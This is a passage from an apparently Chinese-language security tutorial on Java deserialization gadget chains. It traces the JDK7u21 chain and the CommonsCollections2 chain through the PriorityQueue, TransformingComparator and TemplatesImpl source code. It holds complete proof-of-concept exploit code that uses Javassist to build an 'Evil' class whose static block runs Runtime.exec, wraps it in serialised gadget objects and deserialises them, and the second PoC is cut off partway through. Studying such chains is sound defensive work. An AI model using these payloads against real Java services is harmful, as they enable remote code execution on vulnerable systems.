<li>LinkedHashSet &#x7EE7;&#x627F;&#x4E0E; HashSet&#xFF0C;&#x5E76;&#x4E14;&#x5176;&#x5185;&#x90E8;&#x662F;&#x901A;&#x8FC7; LinkedHashMap &#x6765;&#x5B9E;&#x73B0;&#x7684;&#x3002;&#x6709;&#x70B9;&#x7C7B;&#x4F3C;&#x4E8E;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x8BF4;&#x7684;LinkedHashMap &#x5176;&#x5185;&#x90E8;&#x662F;&#x57FA;&#x4E8E; Hashmap &#x5B9E;&#x73B0;&#x4E00;&#x6837;&#xFF0C;&#x4E0D;&#x8FC7;&#x8FD8;&#x662F;&#x6709;&#x4E00;&#x70B9;&#x70B9;&#x533A;&#x522B;&#x7684;&#xFF08;&#x5177;&#x4F53;&#x7684;&#x533A;&#x522B;&#x5927;&#x5BB6;&#x53EF;&#x4EE5;&#x81EA;&#x5DF1;&#x53BB;&#x601D;&#x8003;&#x4E00;&#x4E0B;&#xFF09;&#x3002;
&#x5982;&#x679C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x8FED;&#x4EE3;&#x7684;&#x987A;&#x5E8F;&#x4E3A;&#x63D2;&#x5165;&#x987A;&#x5E8F;&#x6216;&#x8005;&#x8BBF;&#x95EE;&#x987A;&#x5E8F;&#xFF0C;&#x90A3;&#x4E48; LinkedHashSet &#x662F;&#x9700;&#x8981;&#x4F60;&#x9996;&#x5148;&#x8003;&#x8651;&#x7684;&#x3002;</li>
</ul>
<p>&#x56E0;&#x6B64;&#x5229;&#x7528;LinkedHashSet&#x5C31;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x6B21;&#x5E8F;&#x53EF;&#x63A7;&#x3002;</p>
<p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
<span class="hljs-keyword">import</span> javassist.ClassClassPath;
<span class="hljs-keyword">import</span> javassist.ClassPool;
<span class="hljs-keyword">import</span> javassist.CtClass;

<span class="hljs-keyword">import</span> javax.xml.transform.Templates;
<span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;
<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Constructor;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;
<span class="hljs-keyword">import</span> java.lang.reflect.Proxy;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.LinkedHashSet;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">jdk7u21_self</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        <span class="hljs-comment">// ClassPool&#x662F; CtClass &#x5BF9;&#x8C61;&#x7684;&#x5BB9;&#x5668;&#x3002;&#x5B9E;&#x4F8B;&#x5316;&#x4E00;&#x4E2A;ClassPool&#x5BB9;&#x5668;&#x3002;</span>
        ClassPool classPool = ClassPool.getDefault();
        <span class="hljs-comment">// &#x5411;&#x5BB9;&#x5668;&#x4E2D;&#x7684;&#x7C7B;&#x641C;&#x7D22;&#x8DEF;&#x5F84;&#x7684;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;&#x63D2;&#x5165;AbstractTranslet.class&#xFF0C;&#x4E2A;&#x4EBA;&#x8BA4;&#x4E3A;&#x662F;&#x65B9;&#x4FBF;&#x8BA9;&#x540E;&#x9762;&#x80FD;&#x591F;&#x627E;&#x5230;&#x8FD9;&#x4E2A;&#x7C7B;</span>
        classPool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));
        <span class="hljs-comment">// &#x4F7F;&#x7528;&#x5BB9;&#x5668;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;CtClass&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;class&#xFF0C;&#x7C7B;&#x540D;&#x4E3A;Evil</span>
        CtClass ctClass = classPool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);
        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;);&quot;</span>;
        cmd = String.format(cmd, <span class="hljs-string">&quot;calc.exe&quot;</span>);
        <span class="hljs-comment">// &#x7ED9;&#x8FD9;&#x4E2A;&#x7C7B;&#x521B;&#x5EFA; static &#x4EE3;&#x7801;&#x5757;&#xFF0C;&#x5E76;&#x63D2;&#x5165;&#x5230;&#x7C7B;&#x4E2D;</span>
        ctClass.makeClassInitializer().insertBefore(cmd);
        String className = <span class="hljs-string">&quot;Evil&quot;</span> + System.nanoTime();
        <span class="hljs-comment">// &#x91CD;&#x65B0;&#x8BBE;&#x7F6E;&#x7C7B;&#x540D;&#x4E3A;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x7684;&#x540D;&#x5B57;</span>
        ctClass.setName(className);
        <span class="hljs-comment">// &#x7ED9;&#x8FD9;&#x4E2A;&#x7C7B;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x7236;&#x7C7B;&#xFF0C;&#x5373;&#x7EE7;&#x627F;&#x8BE5;&#x7236;&#x7C7B;&#x3002;</span>
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); <span class="hljs-comment">// &#x8BBE;&#x7F6E;&#x7236;&#x7C7B;&#x4E3A;AbstractTranslet&#xFF0C;&#x907F;&#x514D;&#x62A5;&#x9519;</span>
        <span class="hljs-comment">// &#x5C06;&#x8FD9;&#x4E2A;&#x7C7B;&#x8F93;&#x51FA;&#x5230;&#x9879;&#x76EE;&#x76EE;&#x5F55;&#x4E0B;</span>
<span class="hljs-comment">//        ctClass.writeFile(&quot;./&quot;);</span>
        <span class="hljs-comment">// &#x5C06;&#x8FD9;&#x4E2A;class&#x8F6C;&#x6362;&#x4E3A;&#x5B57;&#x8282;&#x6570;&#x7EC4;</span>
        <span class="hljs-keyword">byte</span>[] classBytes = ctClass.toBytecode();
        <span class="hljs-comment">// &#x5C06;&#x5B57;&#x8282;&#x6570;&#x7EC4;&#x653E;&#x7F6E;&#x5230;&#x4E00;&#x4E2A;&#x4E8C;&#x7EF4;&#x6570;&#x7EC4;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;</span>
        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{classBytes};
        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();

        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);
        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);
<span class="hljs-comment">//        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span>

        String zeroHashCodeStr = <span class="hljs-string">&quot;f5a5a608&quot;</span>;

        HashMap map = <span class="hljs-keyword">new</span> HashMap();
        map.put(zeroHashCodeStr, <span class="hljs-string">&quot;foo&quot;</span>);

        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);
        Constructor handlerConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        handlerConstructor.setAccessible(<span class="hljs-keyword">true</span>);
        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);
        setFieldValue(tempHandler, <span class="hljs-string">&quot;type&quot;</span>, Templates.class);
        Templates proxy = (Templates) Proxy.newProxyInstance(Templates.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[]{Templates.class}, tempHandler);

        LinkedHashSet set = <span class="hljs-keyword">new</span> LinkedHashSet(); <span class="hljs-comment">// maintain order</span>
        set.add(templates);
        set.add(proxy);

<span class="hljs-comment">//        setFieldValue(templates, &quot;_auxClasses&quot;, null);</span>
        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);

        map.put(zeroHashCodeStr, templates); <span class="hljs-comment">// swap in real object</span>

        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<span class="hljs-comment">//&#x7528;&#x4E8E;&#x5B58;&#x653E;person&#x5BF9;&#x8C61;&#x5E8F;&#x5217;&#x5316;byte&#x6570;&#x7EC4;&#x7684;&#x8F93;&#x51FA;&#x6D41;</span>
        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(set);<span class="hljs-comment">//&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;</span>
        objectOutputStream.flush();
        objectOutputStream.close();
        <span class="hljs-keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray(); <span class="hljs-comment">//&#x8BFB;&#x53D6;&#x5E8F;&#x5217;&#x5316;&#x540E;&#x7684;&#x5BF9;&#x8C61;byte&#x6570;&#x7EC4;</span>
        ByteArrayInputStream byteArrayInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(bytes);<span class="hljs-comment">//&#x5B58;&#x653E;byte&#x6570;&#x7EC4;&#x7684;&#x8F93;&#x5165;&#x6D41;</span>
        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(byteArrayInputStream);
        Object o = objectInputStream.readObject();
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{
        Field field = <span class="hljs-keyword">null</span>;
        <span class="hljs-keyword">try</span> {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(<span class="hljs-keyword">true</span>);
        }
        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {
            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        <span class="hljs-keyword">return</span> field;
    }
}
</code></pre>
<h3 id="cc2templatesimpl">CC2_TemplatesImpl</h3>
<p>&#x9002;&#x7528;&#x7248;&#x672C;&#xFF1A;commons-collections-4.0, jdk7u21&#x53CA;&#x4EE5;&#x524D; </p>
<p>&#x53C2;&#x8003;: <a href="https://blog.csdn.net/qq_41918771/article/details/117194343" target="_blank">https://blog.csdn.net/qq_41918771/article/details/117194343</a></p>
<p>&#x6700;&#x7EC8;&#x5E8F;&#x5217;&#x5316;&#x4E3A;PriorityQueue&#x7C7B;, &#x4ECE;&#x5176;readObject&#x5F00;&#x59CB;</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span>
        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException </span>{
        <span class="hljs-comment">// Read in size, and any hidden stuff</span>
        s.defaultReadObject();

        <span class="hljs-comment">// Read in (and discard) array length</span>
        s.readInt();

        queue = <span class="hljs-keyword">new</span> Object[size];

        <span class="hljs-comment">// Read in all elements.</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++)
            queue[i] = s.readObject();

        <span class="hljs-comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span>
        <span class="hljs-comment">// spec has never explained what that might be.</span>
        heapify();
    }
</code></pre>
<p>queue&#x503C;&#x548C;size&#x503C;&#x88AB;&#x6211;&#x4EEC;&#x6539;&#x8FC7;, &#x6240;&#x4EE5;for&#x5FAA;&#x73AF;&#x90A3;&#x4E00;&#x5757;&#x7684;size&#x503C;&#x4E3A;2, for&#x5FAA;&#x73AF;&#x7ED3;&#x675F;&#x540E;&#x8DDF;&#x8FDB;heapify&#x65B9;&#x6CD5;</p>
<pre><code>    private void heapify() {
        // &#x8FD9;&#x4E00;&#x5757;size&#x4E3A;2&#x5373;10,&#x53F3;&#x79FB;&#x51CF;&#x4E00;&#x7B49;&#x4E8E;0&#x5373;&#x53EF;&#x8FDB;&#x5165;for&#x5FAA;&#x73AF;
        for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)
            siftDown(i, (E) queue[i]);
    }
</code></pre><p>&#x7EE7;&#x7EED;&#x8DDF;&#x8FDB;siftDown&#x65B9;&#x6CD5;</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">siftDown</span><span class="hljs-params">(<span class="hljs-keyword">int</span> k, E x)</span> </span>{
        <span class="hljs-keyword">if</span> (comparator != <span class="hljs-keyword">null</span>)
            siftDownUsingComparator(k, x);
        <span class="hljs-keyword">else</span>
            siftDownComparable(k, x);
    }
</code></pre>
<p>&#x8BBE;&#x7F6E;&#x4E86;comparator&#x7684;&#x503C;, &#x8DDF;&#x8FDB;if&#x8BED;&#x53E5;&#x4E2D;&#x7684;siftDownUsingComparator&#x65B9;&#x6CD5;</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">siftDownUsingComparator</span><span class="hljs-params">(<span class="hljs-keyword">int</span> k, E x)</span> </span>{
        <span class="hljs-keyword">int</span> half = size &gt;&gt;&gt; <span class="hljs-number">1</span>;
        <span class="hljs-keyword">while</span> (k &lt; half) {
            <span class="hljs-keyword">int</span> child = (k &lt;&lt; <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;
            Object c = queue[child];
            <span class="hljs-keyword">int</span> right = child + <span class="hljs-number">1</span>;
            <span class="hljs-keyword">if</span> (right &lt; size &amp;&amp;
                comparator.compare((E) c, (E) queue[right]) &gt; <span class="hljs-number">0</span>)
                c = queue[child = right];
            <span class="hljs-keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="hljs-number">0</span>)
                <span class="hljs-keyword">break</span>;
            queue[k] = c;
            k = child;
        }
        queue[k] = x;
    }
</code></pre>
<p>&#x5173;&#x952E;&#x4EE3;&#x7801;&#x5728; <code>comparator.compare</code>,  &#x8FD9;&#x91CC;&#x7684;<code>comparator</code>&#x662F;TransformingComparator&#x5B9E;&#x4F8B;&#x5316;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x800C;&#x53D8;&#x91CF;x&#x662F;queue[0]&#xFF0C;&#x56E0;&#x4E3A;&#x5728;<code>heapify</code>&#x51FD;&#x6570;&#x4E2D;&#x662F;&#x4F9D;&#x6B21;&#x5FAA;&#x73AF;&#x7684;&#xFF0C;&#x800C;queue[0]&#x662F;exp&#x4E2D;&#x7684;<code>templates</code></p>
<p><img src="img/1641890092291.png" alt="1641890092291"> </p>
<p>&#x8FDB;&#x5165;compare&#x65B9;&#x6CD5;&#x5C31;&#x5230;&#x4E86;&#x719F;&#x6089;&#x7684;&#x5D4C;&#x5957;&#x8C03;&#x7528;&#x73AF;&#x8282;, <code>this.transformer</code>&#x8D4B;&#x503C;&#x4E3A;InvokerTransformer, &#x6240;&#x4EE5;&#x8C03;&#x7528;&#x5230;&#x5176;transform&#x65B9;&#x6CD5;</p>
<p><img src="img/1641890155680.png" alt="1641890155680"></p>
<p>&#x8DDF;&#x8FDB;InvokerTransformer&#x7C7B;&#x7684;transform&#x65B9;&#x6CD5;</p>
<p><img src="img/1641890313468.png" alt="1641890313468"></p>
<p>&#x8FD9;&#x91CC;&#x7684;&#x5404;&#x4E2A;&#x53D8;&#x91CF;&#x8D4B;&#x503C;&#x8BE6;&#x7EC6;&#x8BF4;&#x660E;&#x4E00;&#x4E0B;:</p>
<ul>
<li>input: TemplatesImpl&#x7C7B;</li>
<li>cls: &#x83B7;&#x53D6;&#x5230;TemplatesImpl&#x5BF9;&#x8C61;</li>
<li>iMethodName: newTransformer&#x65B9;&#x6CD5;</li>
<li>iParamTypes: null</li>
</ul>
<p>&#x8DDF;&#x8FDB;TemplatesImpl&#x4E2D;&#x7684;newTransformer&#x65B9;&#x6CD5;</p>
<pre><code>    public synchronized Transformer newTransformer()
        throws TransformerConfigurationException
    {
        TransformerImpl transformer;

        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
            _indentNumber, _tfactory);

        if (_uriResolver != null) {
            transformer.setURIResolver(_uriResolver);
        }

        if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
            transformer.setSecureProcessing(true);
        }
        return transformer;
    }
</code></pre><p>&#x8DDF;&#x8FDB;getTransletInstance&#x65B9;&#x6CD5;</p>
<pre><code>    private Translet getTransletInstance()
        throws TransformerConfigurationException {
        try {
            // &#x8BBE;&#x7F6E;_name&#x5C5E;&#x6027;&#x7ED5;&#x8FC7;&#x8BE5;if&#x8BED;&#x53E5;
            if (_name == null) return null;
            // &#x8BBE;&#x7F6E;_class&#x4E3A;null&#x8FDB;&#x5165;defineTransletClasses&#x65B9;&#x6CD5;
            if (_class == null) defineTransletClasses();

            // The translet needs to keep a reference to all its auxiliary
            // class to prevent the GC from collecting them
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
            translet.postInitialization();
            translet.setTemplates(this);
            translet.setServicesMechnism(_useServicesMechanism);
            translet.setAllowedProtocols(_accessExternalStylesheet);
            if (_auxClasses != null) {
                translet.setAuxiliaryClasses(_auxClasses);
            }

            return translet;
        }
        catch (InstantiationException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
        catch (IllegalAccessException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
</code></pre><p>&#x8DDF;&#x8FDB; defineTransletClasses &#x65B9;&#x6CD5;</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span>
        <span class="hljs-keyword">throws</span> TransformerConfigurationException </span>{

        <span class="hljs-comment">//&#x5B58;&#x5728;_bytecodes&#x7ED5;&#x8FC7;&#x6B64;if&#x8BED;&#x53E5;</span>
        <span class="hljs-keyword">if</span> (_bytecodes == <span class="hljs-keyword">null</span>) {
            ErrorMsg err = <span class="hljs-keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TransformerConfigurationException(err.toString());
        }

        TransletClassLoader loader = (TransletClassLoader)
            AccessController.doPrivileged(<span class="hljs-keyword">new</span> PrivilegedAction() {
                <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>{
                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
                }
            });

        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> classCount = _bytecodes.length;
            _class = <span class="hljs-keyword">new</span> Class[classCount];

            <span class="hljs-keyword">if</span> (classCount &gt; <span class="hljs-number">1</span>) {
                _auxClasses = <span class="hljs-keyword">new</span> Hashtable();
            }

            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; classCount; i++) {
                <span class="hljs-comment">/*&#x6B64;&#x5904;&#x8C03;&#x7528;
                Class defineClass(final byte[] b) {return defineClass(null, b, 0, b.length);}
                defineClass&#x7C7B;&#x52A0;&#x8F7D;&#x5668;&#x53EF;&#x4EE5;&#x5C06;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#x7801;&#x8FDB;&#x884C;&#x52A8;&#x6001;&#x52A0;&#x8F7D;
                */</span>
                _class[i] = loader.defineClass(_bytecodes[i]);
                <span class="hljs-keyword">final</span> Class superClass = _class[i].getSuperclass();

                <span class="hljs-comment">// Check if this is the main class</span>
                <span class="hljs-comment">// &#x5224;&#x65AD;&#x7236;&#x7C7B;&#x662F;&#x5426;&#x662F;ABSTRACT_TRANSLET</span>
                <span class="hljs-comment">/* &#x5176;&#x7C7B;&#x4E2D;&#x5B9A;&#x4E49;&#x4E3A; 
                private static String ABSTRACT_TRANSLET
        = &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;
                */</span>
                <span class="hljs-keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                    _transletIndex = i;
                }
                <span class="hljs-keyword">else</span> {
                    _auxClasses.put(_class[i].getName(), _class[i]);
                }
            }

            <span class="hljs-keyword">if</span> (_transletIndex &lt; <span class="hljs-number">0</span>) {
                ErrorMsg err= <span class="hljs-keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TransformerConfigurationException(err.toString());
            }
        }
        <span class="hljs-keyword">catch</span> (ClassFormatError e) {
            ErrorMsg err = <span class="hljs-keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TransformerConfigurationException(err.toString());
        }
        <span class="hljs-keyword">catch</span> (LinkageError e) {
            ErrorMsg err = <span class="hljs-keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TransformerConfigurationException(err.toString());
        }
    }
</code></pre>
<p>&#x8D4B;&#x503C;&#x7ED9;<code>_transletIndex</code>&#x540E;&#xFF0C;<code>_class[_transletIndex].newInstance();</code>&#x624D;&#x4F1A;&#x6267;&#x884C;&#x6211;&#x4EEC;&#x6076;&#x610F;&#x7684;static&#x4EE3;&#x7801;&#x5757; </p>
<pre><code class="lang-java"><span class="hljs-comment">// The translet needs to keep a reference to all its auxiliary</span>
<span class="hljs-comment">// class to prevent the GC from collecting them</span>
<span class="hljs-comment">// JVM&#x5728;&#x52A0;&#x8F7D;&#x7C7B;&#x65F6;&#x5728;main&#x65B9;&#x6CD5;&#x4E4B;&#x524D;&#x6267;&#x884C;&#x9759;&#x6001;&#x5757;</span>
AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
</code></pre>
<p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
<span class="hljs-keyword">import</span> javassist.ClassClassPath;
<span class="hljs-keyword">import</span> javassist.ClassPool;
<span class="hljs-keyword">import</span> javassist.CtClass;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;

<span class="hljs-keyword">import</span> java.io.*;
<span class="hljs-keyword">import</span> java.lang.reflect.Constructor;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.PriorityQueue;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2_Templat</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        <span class="hljs-comment">// &#x53CD;&#x5C04;&#x5B9E;&#x4F8B;&#x5316;InvokerTransformer&#x5BF9;&#x8C61;&#xFF0C;&#x8BBE;&#x7F6E;InvokerTransformer&#x7684;methodName&#x4E3A;&quot;newTransformer&quot;</span>
        Class clazz = Class.forName(<span class="hljs-string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>);
        Constructor constructor = clazz.getDeclaredConstructor(String.class);
        constructor.setAccessible(<span class="hljs-keyword">true</span>);
        InvokerTransformer invokerTransformer = (InvokerTransformer) constructor.newInstance(<span class="hljs-string">&quot;newTransformer&quot;</span>);
        <span class="hljs-comment">// &#x5B9E;&#x4F8B;&#x5316;&#x4E00;&#x4E2A;TransformingComparator&#x5BF9;&#x8C61;&#xFF0C;&#x5E76;&#x4E14;&#x4F20;&#x5165;&#x4E86;invokerTransformer&#xFF0C;&#x9700;&#x8981;&#x6CE8;&#x610F;TransformingComparator&#x4E2D;&#x7684;compare&#x65B9;&#x6CD5;</span>
        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(invokerTransformer);
        <span class="hljs-comment">// &#x5B9E;&#x4F8B;&#x5316;PriorityQueue&#x5BF9;&#x8C61;</span>
        PriorityQueue priorityQueue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);
        <span class="hljs-comment">// ClassPool&#x662F; CtClass &#x5BF9;&#x8C61;&#x7684;&#x5BB9;&#x5668;&#x3002;&#x5B9E;&#x4F8B;&#x5316;&#x4E00;&#x4E2A;ClassPool&#x5BB9;&#x5668;&#x3002;</span>
        ClassPool classPool = ClassPool.getDefault();
        <span class="hljs-comment">// &#x5411;&#x5BB9;&#x5668;&#x4E2D;&#x7684;&#x7C7B;&#x641C;&#x7D22;&#x8DEF;&#x5F84;&#x7684;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;&#x63D2;&#x5165;AbstractTranslet.class&#xFF0C;&#x4E2A;&#x4EBA;&#x8BA4;&#x4E3A;&#x662F;&#x65B9;&#x4FBF;&#x8BA9;&#x540E;&#x9762;&#x80FD;&#x591F;&#x627E;&#x5230;&#x8FD9;&#x4E2A;&#x7C7B;</span>
        classPool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));
        <span class="hljs-comment">// &#x4F7F;&#x7528;&#x5BB9;&#x5668;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;CtClass&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;class&#xFF0C;&#x7C7B;&#x540D;&#x4E3A;Evil</span>
        CtClass ctClass = classPool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);
        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;);&quot;</span>;
        cmd = String.format(cmd, <span class="hljs-string">&quot;calc.exe&quot;</span>);
        <span class="hljs-comment">// &#x7ED9;&#x8FD9;&#x4E2A;&#x7C7B;&#x521B;&#x5EFA; static &#x4EE3;&#x7801;&#x5757;&#xFF0C;&#x5E76;&#x63D2;&#x5165;&#x5230;&#x7C7B;&#x4E2D;</span>
        ctClass.makeClassInitializer().insertBefore(cmd);
        String className = <span class="hljs-string">&quot;Evil&quot;</span> + System.nanoTime();
        <span class="hljs-comment">// &#x91CD;&#x65B0;&#x8BBE;&#x7F6E;&#x7C7B;&#x540D;&#x4E3A;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x7684;&#x540D;&#x5B57;</span>
        ctClass.setName(className);
        <span class="hljs-comment">// &#x7ED9;&#x8FD9;&#x4E2A;&#x7C7B;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x7236;&#x7C7B;&#xFF0C;&#x5373;&#x7EE7;&#x627F;&#x8BE5;&#x7236;&#x7C7B;&#x3002;</span>
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); <span class="hljs-comment">// &#x8BBE;&#x7F6E;&#x7236;&#x7C7B;&#x4E3A;AbstractTranslet&#xFF0C;&#x907F;&#x514D;&#x62A5;&#x9519;</span>
        <span class="hljs-comment">// &#x5C06;&#x8FD9;&#x4E2A;&#x7C7B;&#x8F93;&#x51FA;&#x5230;&#x9879;&#x76EE;&#x76EE;&#x5F55;&#x4E0B;</span>
<span class="hljs-comment">//        ctClass.writeFile(&quot;./&quot;);</span>
        <span class="hljs-comment">// &#x5C06;&#x8FD9;&#x4E2A;class&#x8F6C;&#x6362;&#x4E3A;&#x5B57;&#x8282;&#x6570;&#x7EC4;</span>
        <span class="hljs-keyword">byte</span>[] classBytes = ctClass.toBytecode();
        <span class="hljs-comment">// &#x5C06;&#x5B57;&#x8282;&#x6570;&#x7EC4;&#x653E;&#x7F6E;&#x5230;&#x4E00;&#x4E2A;&#x4E8C;&#x7EF4;&#x6570;&#x7EC4;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;</span>
        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{classBytes};
